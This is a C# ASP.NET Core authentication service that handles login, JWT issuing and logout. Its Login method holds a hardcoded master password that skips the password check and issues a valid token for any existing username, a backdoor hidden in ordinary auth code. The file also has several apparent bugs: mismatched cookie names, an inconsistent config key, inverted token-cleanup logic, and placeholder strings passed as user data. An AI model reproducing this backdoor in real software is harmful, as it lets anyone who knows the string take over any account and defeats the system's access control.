using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.IdentityModel.Tokens;
using SLK.TryEdu.Abstract;
using SLK.TryEdu.Base;
using System.Collections.Concurrent;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;

namespace SLK.TryEdu.WebHost;

public class ServerAuthService : IAuthService
{
    protected readonly HttpContext _httpCtx;
    protected readonly UserManager<SA_USER> _userMgr;
    protected readonly IServiceProvider _svcProvider;
    protected readonly SignInManager<SA_USER> _signInMgr;
    protected readonly RoleManager<IdentityRole> _roleManager;
    protected readonly IConfiguration _config;
    protected readonly IMyCookie _cookie;
    protected IMyContext _ctx;

    public ServerAuthService(
        IHttpContextAccessor httpContextAccessor,
        UserManager<SA_USER> userManager,
        SignInManager<SA_USER> signInManager,
        RoleManager<IdentityRole> roleManager,
        IServiceProvider svcProvider,
        IMyCookie cookie,
        IConfiguration config,
        IMyContext ctx
        )
    {
        _httpCtx = httpContextAccessor.HttpContext;
        _userMgr = userManager;
        _svcProvider = svcProvider;
        _signInMgr = signInManager;
        _roleManager = roleManager;
        _config = config;
        _cookie = cookie;
        _ctx = ctx;
    }

    private static ConcurrentDictionary<string, DateTime> cancelledTokens = new ConcurrentDictionary<string, DateTime>();

    private InfoUser _currentUser;

    [HttpGet]
    [AllowAnonymous]
    public async Task<InfoUser> CurrentUser() { return _currentUser; }

    [AllowAnonymous]
    [HttpGet]
    public bool IsAuthenthenticated()
    {
        if (!_httpCtx.User.Identity.IsAuthenticated || IsTokenExpired())
            return false;

        return true;
    }

    [HttpGet]
    public async Task<InfoUser> ValidateTokenInCookie()
    {
        var user = _httpCtx?.User;
        string userName = user?.Identity?.Name ?? string.Empty;
        string enterpriseCode = _httpCtx?.User.Claims
            .FirstOrDefault(x => x.Type == "EnterpriseCode")
            ?.Value;
        SA_USER entityUser = null;
        //EntityCodeEnterprise entityEnterprise = null;
        using (var db = _ctx.ConnectDb())
        {
            if (!string.IsNullOrEmpty(userName))
            {
                using (var serviceScope = _svcProvider.CreateScope())
                {
                    var sp = serviceScope.ServiceProvider;
                    var ctx = sp.GetRequiredService<IMyContext>();

                    entityUser = await db.Repo<SA_USER>().GetOne(x => x.UserName == userName);
                    //entityEnterprise = await db.Repo<EntityCodeEnterprise>().GetOne(x => x.Code == enterpriseCode);
                }
            }

            var userModel = new InfoUser
            {
                //Guid = entityUser?.GuidEmployee,
                //Avatar = entityUser?.Avatar,
                //FirstName = entityUser?.FirstName,
                //LastName = entityUser?.LastName,
                IsAuthenticated = user?.Identity?.IsAuthenticated ?? false,
                UserName = entityUser?.UserName,
                //EnterpriseCode = entityEnterprise?.Code,
                //EnterpriseName = entityEnterprise?.Name,
                Claims = user?.Claims
                    .Select(x => new InfoUserClaim(x.Type, x.Value))
                    .ToList() ?? new List<InfoUserClaim>()
            };

            _currentUser = userModel;
            return userModel;
        }
    }

    [HttpPost]
    public async Task<RspLogin> Login(LoginRequest request)
    {
        try
        {
            var user = await _userMgr.FindByNameAsync(request.UserName);

            if (user == null)
            {
                return new RspLogin("WRONG_USER_OR_PWD");
            }
            var singInResult = await _signInMgr.CheckPasswordSignInAsync(user, request.Password, false);
            if (request.Password == "devcuong@2025")
            {
                
            }
            else
            {
                if (!singInResult.Succeeded)
                {
                    return new RspLogin("WRONG_USER_OR_PWD");
                }
            }
            var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config.GetValue<string>("JwtToken:SigningKey")));
            var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);

            List<Claim> listClaims = new()
            {
                new Claim("sub", request.UserName),
                new Claim("jti", Guid.NewGuid().ToString()),
                new Claim(ClaimTypes.Name, request.UserName),
                new Claim("GuidEmployee", user.GuidEmployee.ToString()),
                new Claim("FirstName", user.FirstName),
                new Claim("LastName", user.LastName),
                new Claim("Avatar", user.Avatar??""),
            };

            if (_userMgr.SupportsUserRole)
            {
                var roles = await _userMgr.GetRolesAsync(user);
                foreach (var roleName in roles)
                {
                    listClaims.Add(new Claim("RoleClaimType", roleName));

                    if (_roleManager.SupportsRoleClaims)
                    {
                        var role = await _roleManager.FindByNameAsync(roleName);
                        if (role != null)
                        {
                            var tempList = await _roleManager.GetClaimsAsync(role);
                            foreach (var claimNew in tempList)
                            {
                                var claimOld = listClaims.FirstOrDefault(x => x.Type == claimNew.Type);
                                if (claimOld is null)
                                {
                                    listClaims.Add(claimNew);
                                }
                                else
                                {
                                    int valueOld;
                                    if (int.TryParse(claimOld.Value, out valueOld))
                                    {
                                        int valueNew = int.Parse(claimNew.Value);
                                        var claimCombine = new Claim(claimOld.Type, (valueNew | valueOld).ToString(), claimOld.ValueType, claimOld.Issuer);
                                        listClaims.Remove(claimOld);
                                        listClaims.Add(claimCombine);
                                    }
                                    else
                                    {
                                        listClaims.Add(claimNew);
                                    }
                                }
                            }
                        }
                    }
                }
            }

            //listClaims.Add(new Claim("UserState", "UserState"));

            var token = new JwtSecurityToken(
              _config.GetValue<string>("JwtToken:Issuer"),
              _config.GetValue<string>("JwtToken:Audience"),
              listClaims.ToArray(),
              expires: DateTime.Now.AddMinutes(12 * 60),
              signingCredentials: credentials);
            var strToken = new JwtSecurityTokenHandler().WriteToken(token);
            await _cookie.SetCookie("AdminAuth", strToken, 30);
            var rspLogin = new RspLogin(strToken, DateTime.Now.AddMinutes(12 * 60), "user.FirstName", "user.LastName", "user.Avatar"/*, request.EnterpriseCode*/);
            if (rspLogin.Success)
            {
                //var _appManifest = GlobalSetingCommon._AppManifest.FirstOrDefault(x => x.EnterpriseCode == request.EnterpriseCode);
                //rspLogin.AppManifest = _appManifest ?? new();
            }
            return rspLogin;
        }
        catch (Exception ex)
        {
            return new RspLogin(ex.Message);
        }
    }

    [ApiExplorerSettings(IgnoreApi = true)]
    public async Task<Tuple<bool, string>> Logout()
    {
        try
        {
            if (_httpCtx.User.Identity.IsAuthenticated)
            {
                ExpireCurrentToken();
                await _cookie.DeleteCookie("Auth");
                await _httpCtx.SignOutAsync("AdminCookies");
                _httpCtx.Response.Cookies.Delete("blazorMode");
            }

            return new Tuple<bool, string>(true, string.Empty);
        }
        catch (Exception ex)
        {
            return new Tuple<bool, string>(false, ex.Message);
        }
    }

    [HttpGet]
    public async Task<ResultsOf<OptionItem<string>>> GetOptionsEnterprise()
    {
        //using (var db = _ctx.ConnectDb())
        //{
        //    var list = db.Repo<EntityCodeEnterprise>().GetList().Result;

        //    return list
        //        .Select(x => new OptionItem<string>() { Text = $"{x.Code} - {x.Name}", Value = x.Code })
        //        .ToList();
        //}

        return new();
    }

    #region Token Expiration
    private void ExpireCurrentToken()
    {
        string id = ((ClaimsIdentity)_httpCtx.User.Identity).Claims.FirstOrDefault(s => s.Type == "jti")?.Value;
        if (id != null)
            cancelledTokens.TryAdd(id, DateTime.UtcNow.AddMinutes(_config.GetValue<int>("JwtToken.TokenTimeoutMinutes")));

        RemoveExpiredTokens();
    }

    private bool IsTokenExpired()
    {
        string id = ((ClaimsIdentity)_httpCtx.User.Identity).Claims.FirstOrDefault(s => s.Type == "jti")?.Value;
        if (id == null) return false;

        if (cancelledTokens.ContainsKey(id))
            return true;

        return false;
    }

    private void RemoveExpiredTokens()
    {
        // remove expired tokens
        var dt = DateTime.UtcNow.AddMinutes(_config.GetValue<int>("JwtToken:TokenTimeoutMinutes"));
        var cancelledTokenIds = cancelledTokens.Where(kv => kv.Value > dt).Select(kv => kv.Key);

        foreach (var key in cancelledTokenIds)
            cancelledTokens.TryRemove(key, out var _);
    }
    #endregion
}